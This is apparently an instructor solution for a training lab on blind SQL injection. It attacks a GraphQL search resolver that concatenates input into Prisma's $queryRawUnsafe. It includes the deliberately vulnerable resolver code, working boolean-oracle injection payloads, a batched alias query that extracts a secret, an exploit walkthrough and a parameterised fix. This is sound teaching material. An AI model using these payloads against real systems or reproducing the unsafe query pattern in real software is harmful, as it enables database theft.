# Solution — sqli-graphql-batch-prisma-raw

> **OWASP:** A03:2021-Injection · **CWE:** CWE-89 · **CVE:** N/A — this lab teaches the vulnerability class, not a specific product CVE.

<!-- Instructor/authoring reference. Students should try the hints first. -->

## What tipped you off

Two smells. First, `searchReports(filter: String!)` takes a free-form string and
substring-matches it against titles — the exact shape of a `LIKE` query, and `LIKE`
is where developers most often reach for raw SQL. Second, the response to a search
is a _list_: it either has rows or it does not. That binary — "did this search
return anything?" — is a ready-made boolean oracle the moment you can make the
`WHERE` clause depend on something other than the title. The `/metrics` endpoint is
the third tell: it advertises that the resolver can be called many times per
request, which only matters if you plan to.

## The class of bug

- **Boolean-based blind SQL injection** — CWE-89, OWASP **A03:2021 – Injection**.
  No UNION output, no error text, no data echoed in the body. The only channel is
  "the search returned >= 1 row" vs "0 rows". That single bit per probe is a
  complete read primitive.
- The delivery twist is **GraphQL operation/alias batching**: because one document
  can contain hundreds of aliased `searchReports` fields, the thousands of requests
  a naive blind extraction would need collapse to a handful of round-trips (the API
  enforces no query-depth, complexity, or per-client rate limit).

## Vulnerability

`src/app/resolvers.ts`, the `searchReports` resolver:

```ts
const sql = "SELECT id, title FROM reports WHERE title LIKE '%" + args.filter + "%'";
const rows = (await prisma.$queryRawUnsafe(sql)) as ReportRow[];
```

`args.filter` is the GraphQL argument, concatenated straight into the query text
and executed with `prisma.$queryRawUnsafe`. That method runs the string verbatim —
it does **not** parameterise. Prisma's safe sibling — the tagged template
`prisma.$queryRaw` with `${value}` interpolation — sends the value as a bound
parameter, and this bug would not exist. `/solve` is written the correct way (a
bound `prisma.secret.findFirst`) on purpose: it is not injectable; `searchReports` is.

## Why the developer wrote it this way

The team adopted an ORM specifically to avoid hand-written SQL, and for 99% of the
app that worked. Then one screen needed a case-insensitive "contains" search over
titles, the query-builder spelling for `LIKE '%x%'` felt awkward, and someone
found `$queryRawUnsafe` in the docs and used it "just for this one query." The
method name literally contains the word _Unsafe_, but it was the shortest path to a
working `LIKE`, the input was "just a search box," and the code reviewer saw an ORM
call and moved on. Meanwhile the GraphQL server shipped with introspection on and
no depth/complexity/operation limits — sensible-looking defaults for an internal
tool — which is what makes the batched attack cheap.

## Why it exists

Prisma normally protects you because its generated methods bind every value. The
raw escape hatch removes that protection and the `Unsafe` suffix is the only
guardrail — a naming convention, not a mechanism. Once user input reaches
`$queryRawUnsafe` as concatenated text, Postgres evaluates whatever predicate you
smuggle in. Because the result set feeds a GraphQL list, "rows present / absent"
becomes the oracle. And because GraphQL aliases let one request run the resolver N
times, blind extraction that would take hundreds of HTTP requests takes a few.

## The mechanical exploit

`filter` lands inside `'%...%'`, so the injection template is: close the literal,
`AND` a predicate, and comment out the trailing `%'` the app appends. The secret
is in another table, so the predicate is a scalar sub-select:

```
' AND (SELECT substr(batch_flag,<pos>,1) FROM secrets LIMIT 1)='<c>' --
```

The full query becomes:

```
SELECT id, title FROM reports
WHERE title LIKE '%' AND (SELECT substr(batch_flag,<pos>,1) FROM secrets LIMIT 1)='<c>' -- %'
```

`title LIKE '%'` matches every report, so the whole `WHERE` is true — and the
search returns rows — **iff** character `<pos>` of `batch_flag` equals `<c>`.
`batch_flag` is 40 hex characters, so each position has only 16 candidates.

Confirm the oracle first:

```
searchReports(filter: "")            -> rows (baseline true)
searchReports(filter: "' AND 1=2 -- ") -> no rows (false)
```

Now batch. Instead of one probe per request, pack many aliased probes into one
document:

```graphql
query {
  p1c0: searchReports(filter: "' AND (SELECT substr(batch_flag,1,1) FROM secrets LIMIT 1)='0' -- ") { id }
  p1c1: searchReports(filter: "' AND (SELECT substr(batch_flag,1,1) FROM secrets LIMIT 1)='1' -- ") { id }
  ...
  p8cf: searchReports(filter: "' AND (SELECT substr(batch_flag,8,1) FROM secrets LIMIT 1)='f' -- ") { id }
}
```

For each alias in the response `data`, a non-empty list means that `(pos, char)`
pair is correct. 40 positions x 16 hex = 640 probes; sending 8 positions (128
aliases) per request is just 5 requests.

## Exploit walkthrough

`tests/exploit.py` (stdlib only) does exactly this:

1. **Sanity-check the oracle** with a baseline (`filter: ""` -> rows) and a false
   probe (`' AND 1=2 -- ` -> no rows), batched into one request, so a broken target
   fails loudly.
2. **Batch-extract** all 40 characters: it builds one GraphQL document per block of
   8 positions (128 aliases each), POSTs it to `/graphql`, and reads which aliases
   returned rows to pin each character. Five requests total, well under a second of
   network time — far inside the 60s budget.
3. **Report amplification** by querying `metrics { searchReportsCalls graphqlRequests }`
   so you can see, e.g., ~640 resolver calls over ~6 HTTP requests.
4. **Submit** the reconstructed 40-char secret to `POST /solve {"flag": "..."}`.
   `/solve` compares it to `secrets.batch_flag` with a bound query and, on a match,
   reads `$FLAG_PATH` in code and returns `{"flag": "FLAG{...}"}`.
5. **Verify** the flag equals `FLAG{ hmac_sha256(LAB_USER_SECRET, "v1|<slug>") }`
   and print it on the last line.

## Fix

Use a bound query and never concatenate user input into raw SQL:

```ts
// Safe: tagged-template $queryRaw binds `filter` as a parameter.
const rows = await prisma.$queryRaw<ReportRow[]>`
  SELECT id, title FROM reports WHERE title LIKE ${'%' + filter + '%'}
`;
// Better still, skip raw SQL entirely:
const rows = await prisma.report.findMany({
  where: { title: { contains: filter } },
  select: { id: true, title: true },
});
```

With either form, `filter` travels as a _value_, so `' AND (...) -- ` is matched
literally against titles and the injected predicate never executes. Defence in
depth for the GraphQL layer: cap operation/alias count and query complexity (e.g.
a validation rule or `graphql-armor`), disable introspection in production, and add
per-client rate limiting so batching cannot be used to amplify any future bug.

## Lab-vs-production deviation

- **Secret alphabet.** `secrets.batch_flag` is a 40-character _lowercase-hex_
  string (20 random bytes rendered as hex). The catalog calls it a "40-char
  string"; constraining it to hex fixes the per-position search space at 16
  candidates so the batched extraction is deterministic and finishes in a few
  requests. The extraction technique is identical for a larger alphabet — you would
  simply enumerate more candidates per position (or binary-search each character).
- **`/solve` and `/metrics` are plain HTTP helpers**, not part of the vulnerable
  GraphQL surface. In a real target you would exfiltrate through the injection and
  there would be no "submit the secret" endpoint; here `/solve` is the grading hook
  and `/metrics` is a teaching aid for batch tuning.
- **The flag is never the secret.** `batch_flag` is what you extract via SQLi; the
  actual `FLAG{...}` is an HMAC over the per-container `LAB_USER_SECRET`, written to
  a tmpfs at boot and released by `/solve` only after an exact `batch_flag` match.
